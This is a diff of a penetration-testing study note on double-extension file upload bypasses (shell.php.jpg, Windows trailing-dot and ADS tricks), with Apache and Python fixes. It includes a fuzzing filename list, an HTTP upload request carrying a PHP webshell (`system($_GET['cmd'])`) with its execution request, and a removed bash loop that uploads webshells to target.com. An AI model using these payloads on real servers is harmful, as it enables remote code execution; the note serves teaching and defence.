@@ -7,188 +7,147 @@ topic: "22.05 Double Extension (file.php.jpg)"
 
 # 22.05 — Double Extension (file.php.jpg)
 
-## What Is Double Extension?
+## What is it?
+When applications accept file uploads, they typically check the file extension to ensure it is safe (e.g., verifying it ends in `.jpg`). However, an attacker can supply a filename with multiple extensions, such as `shell.php.jpg`. 
 
+The vulnerability arises when the web application validation logic and the web server execution logic disagree on how to parse extensions. The application might look at the *last* extension (`.jpg`), declare it safe, and save it. Meanwhile, older or misconfigured web servers (like Apache configured with `AddHandler`) might look at the filename, see the `.php` extension anywhere in the string, and decide to execute it as a PHP script regardless of the trailing `.jpg`.
+
+Additionally, Windows environments have specific quirks. Uploading `shell.php.` (with a trailing dot) or `shell.php ` (with a trailing space) might bypass a blacklist looking strictly for `.php`. When Windows saves the file, it automatically strips the trailing dot or space, resulting in an executable `shell.php`.
+
+## ASCII Diagram
+```text
+[Attacker]
+   │
+   │ 1. Uploads file: "shell.php.jpg"
+   ▼
+[Web Application Validator]
+   │
+   │ 2. Extracts last extension: ".jpg"
+   │ 3. Is ".jpg" allowed? YES
+   ▼
+[File System] ─── 4. Saves as: /var/www/html/uploads/shell.php.jpg
+   │
+[Attacker] ────── 5. Requests: GET /uploads/shell.php.jpg
+   │
+[Apache Web Server (Misconfigured)]
+   │
+   │ 6. Parses filename: "shell.php.jpg"
+   │ 7. Contains ".php"? YES! -> Hand off to PHP interpreter!
+   ▼
+[PHP Interpreter executes shell.php.jpg]
 ```
-FILENAME WITH TWO EXTENSIONS:
+
+## How to Find It
+- **Manual steps:**
+  1. Intercept a file upload request using Burp Suite.
+  2. Change the filename to include a double extension (e.g., `test.php.jpg`).
+  3. Ensure the file content actually contains a simple script (e.g., `<?php echo "VULNERABLE"; ?>`).
+  4. Submit the upload.
+  5. Navigate to the uploaded file's URL. If the browser displays the word "VULNERABLE" instead of a broken image icon, the file was executed as code.
+  6. On Windows targets, try appending dots or spaces (`test.php.` or `test.php `).
+
+- **Tool commands with flags explained:**
+  To quickly generate a list of permutations for fuzzing with Intruder or ffuf:
+  ```bash
+  cat << 'EOF' > double_exts.txt
   shell.php.jpg
+  shell.php.png
+  shell.jpg.php
+  shell.php.
+  shell.php_
+  shell.php%20
+  shell.php::$DATA
+  EOF
+  ```
+
+## How to Exploit It
+- **Step-by-step walkthrough:**
+  1. Identify an upload endpoint that permits image uploads (`.jpg`, `.png`, etc.).
+  2. Create a PHP webshell payload.
+  3. Modify the filename in the HTTP POST request to `shell.php.jpg`.
+  4. Send the request. If successful, locate the path to the uploaded file.
+  5. Access the file via the browser or `curl`. If Apache is misconfigured to execute any file containing `.php`, your shell will run.
+
+- **Actual payloads:**
+  **Standard Double Extension:**
+  ```text
+  filename="shell.php.jpg"
+  ```
+  **Windows Trailing Dot/Space Bypass:**
+  ```text
+  filename="shell.php."
+  filename="shell.php "
+  ```
+  **Windows Alternate Data Stream (ADS):**
+  ```text
+  filename="shell.php::$DATA"
+  ```
+
+- **Real HTTP request/response examples:**
+  **Upload Request:**
+  ```http
+  POST /api/upload HTTP/1.1
+  Host: target.com
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+  ------WebKitFormBoundary
+  Content-Disposition: form-data; name="image"; filename="shell.php.jpg"
+  Content-Type: image/jpeg
+
+  <?php system($_GET['cmd']); ?>
+  ------WebKitFormBoundary--
+  ```
+  **Execution Request:**
+  ```http
+  GET /uploads/shell.php.jpg?cmd=whoami HTTP/1.1
+  Host: target.com
+
+  HTTP/1.1 200 OK
   
-  ATTACKER PERSPECTIVE:
-  - Extension check sees: .jpg → "it's an image, allow it!"
-  - Server executes based on: which extension wins?
-  
-  DEPENDS ON SERVER CONFIGURATION:
-  Some servers: last extension wins → .jpg → not PHP
-  Some servers: ANY extension wins → .php wins → EXECUTES!
-  Some: based on Apache AddHandler for PHP
-```
+  www-data
+  ```
 
----
+## Real-World Example
+In a known penetration test, a file upload portal strictly validated that files must end in `.pdf` or `.jpg`. The tester uploaded a file named `report.php.pdf`. The application saved the file. However, the application was hosted on an Apache server that had a legacy configuration line: `AddHandler application/x-httpd-php .php`. This directive tells Apache to parse *any* file containing `.php` in its name. When the tester navigated to `report.php.pdf`, Apache executed the embedded PHP code, leading to an immediate remote shell.
 
-## When Double Extension Works
+## How to Fix It
+- **Developer remediation:**
+  Do not use `AddHandler` in Apache configurations; use `AddType` instead, or better yet, explicitly define `<FilesMatch>` directives that anchor the extension to the end of the string (`\.php$`). On the application side, strictly extract the true, final extension. The absolute best defense is to completely discard the user-supplied filename and generate a secure UUID for the file upon saving.
 
-```
-APACHE AddHandler MISCONFIGURATION:
-  Some Apache configs:
+- **Code snippet:**
+  **Apache Configuration Fix:**
+  ```apache
+  # BAD - Matches shell.php.jpg
   AddHandler application/x-httpd-php .php
   
-  This means: "ANY file with .php ANYWHERE in the name → execute as PHP"
-  NOT just files ending in .php!
+  # GOOD - Only matches files ending exactly in .php
+  <FilesMatch "\.php$">
+      SetHandler application/x-httpd-php
+  </FilesMatch>
+  ```
   
-  FILE: shell.php.jpg
-  → Contains ".php" in name → Apache executes as PHP!
-  → Extension check sees ".jpg" → passes!
-  
-  EXPLOIT:
-  Upload: shell.php.jpg (with PHP content)
-  Server saves: /uploads/shell.php.jpg
-  Visit: https://target.com/uploads/shell.php.jpg?cmd=id
-  → PHP EXECUTED!
-  
-  ALSO:
-  shell.php5.jpg → .php5 triggers execution even with .jpg suffix
-  malicious.aspx.jpg → if server has issue with ASPX detection
-```
+  **Python (Secure Filename Generation):**
+  ```python
+  import uuid
+  from pathlib import Path
 
----
+  def secure_upload(filename):
+      # Extract only the last extension
+      ext = Path(filename).suffix.lower()
+      
+      if ext not in ['.jpg', '.png']:
+          raise ValueError("Invalid extension")
+          
+      # Discard the original name (shell.php.jpg) and generate a new one
+      safe_filename = f"{uuid.uuid4()}{ext}"
+      return safe_filename
+  ```
 
-## How Extension Parsing Works
-
-```
-SAFE PARSING (take LAST extension):
-  shell.php.jpg → extension = .jpg → not PHP → safe!
-  
-UNSAFE PARSING (check ALL extensions):
-  shell.php.jpg → has .php → execute as PHP → DANGEROUS!
-  
-APACHE AddHandler vs AddType:
-  AddHandler application/x-httpd-php .php
-  → Matches on ANY occurrence of .php in filename!
-  → shell.php.jpg matches!
-  
-  AddType application/x-httpd-php .php
-  → Only matches files WHERE LAST EXTENSION IS .php
-  → shell.php.jpg does NOT match!
-  
-  TESTING:
-  Upload shell.php.jpg → does it execute as PHP?
-  → YES = AddHandler (unsafe) or other misconfiguration
-  → NO = AddType (safer) or properly configured
-```
-
----
-
-## Testing Double Extension
-
-```bash
-# TEST ALL COMBINATIONS:
-WEBSHELL='<?php system($_GET["cmd"]); ?>'
-
-# Create test files:
-COMBOS=(
-  "shell.php.jpg"
-  "shell.php.png"
-  "shell.php.gif"
-  "shell.php5.jpg"
-  "shell.phtml.jpg"
-  "shell.php.jpeg"
-  "shell.php.webp"
-  "shell.PHP.jpg"    # case variation
-  "shell.jpg.php"    # reverse order (might help if check is on first ext)
-)
-
-for FILENAME in "${COMBOS[@]}"; do
-  echo "$WEBSHELL" > "$FILENAME"
-  echo "Created: $FILENAME"
-done
-
-# UPLOAD EACH AND TEST:
-UPLOAD_BASE="https://target.com/uploads"
-for FILENAME in "${COMBOS[@]}"; do
-  echo "Testing: $FILENAME"
-  # Upload:
-  RESPONSE=$(curl -s -X POST https://target.com/upload \
-    -b "session=SESSION" \
-    -F "file=@$FILENAME;type=image/jpeg")
-  
-  # Try to execute:
-  EXT_PATH="$UPLOAD_BASE/$FILENAME"
-  EXEC_TEST=$(curl -s "$EXT_PATH?cmd=echo+PWNED")
-  echo "  Response: $EXEC_TEST" | head -c 100
-done
-
-# ALSO TEST: PHP inside valid JPEG structure:
-# (Cover image parsing in note 12)
-```
-
----
-
-## Extension Confusion in Windows vs Linux
-
-```
-WINDOWS EXTENSION HANDLING:
-  Windows ignores characters AFTER a space or dot at end:
-  shell.php   → same as → shell.php. (trailing dot stripped)
-  shell.php   → same as → shell.php  (trailing space stripped)
-  
-  UPLOAD: shell.php.  (with trailing dot)
-  → Windows saves as: shell.php (strips trailing dot)
-  → App validated: ".php." extension → not in blocklist!
-  → Saved as: shell.php → executable!
-  
-  UPLOAD: shell.php (with trailing space: shell.php )
-  → Windows saves as: shell.php (strips space)
-  
-  UPLOAD: shell.php::$DATA (Windows ADS)
-  → Alternate Data Stream → saves as: shell.php
-  
-  MORE WINDOWS TRICKS:
-  shell.php:jpg → ADS → saves as shell.php (? server-dependent)
-  
-  (Most relevant for Windows-hosted apps — IIS, ASP.NET)
-```
-
----
-
-## Fix
-
-```
-CORRECT EXTENSION EXTRACTION:
-
-# PYTHON:
-from pathlib import Path
-
-def get_extension(filename):
-    # Get ONLY the last extension:
-    return Path(filename).suffix.lower()  # returns ".jpg", ".png", etc.
-    
-    # NOT: checking if any part of name contains forbidden extension
-    # NOT: checking all extensions in a loop
-
-ALLOWED = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf'}
-
-def validate_upload(filename):
-    ext = get_extension(filename)
-    if ext not in ALLOWED:
-        raise ValueError(f"Extension '{ext}' not allowed")
-    return True
-
-# ALSO: Rename to UUID + controlled extension:
-import uuid, os
-safe_filename = str(uuid.uuid4()) + '.jpg'
-# → Even if original was shell.php.jpg → saved as random-uuid.jpg
-# → No way to access shell.php.jpg by name!
-
-# APACHE: Use AddType NOT AddHandler:
-# BAD:  AddHandler application/x-httpd-php .php
-# GOOD: AddType application/x-httpd-php .php
-# AND:  Also disable PHP in uploads directory entirely!
-```
-
----
+## Chaining Opportunities
+- This vuln + [[12 - Image Upload Magic Bytes Bypass]] → Some applications check both the extension and the file's magic bytes. Combine `shell.php.jpg` with valid JPEG magic bytes (`FF D8 FF E0`) to bypass both checks simultaneously.
+- This vuln + [[06 - Null Byte Injection (file.php%00.jpg)]] → If `shell.php.jpg` does not execute because the server only executes files ending *exactly* in `.php`, try `shell.php%00.jpg` to truncate the trailing `.jpg` at the OS level.
 
 ## Related Notes
-- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — alternative extension bypass
-- [[06 - Null Byte Injection (file.php%00.jpg)]] — null byte trick
-- [[12 - Image Upload Magic Bytes Bypass]] — combining with magic bytes
-- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
+- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
+- [[06 - Null Byte Injection (file.php%00.jpg)]]
+- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
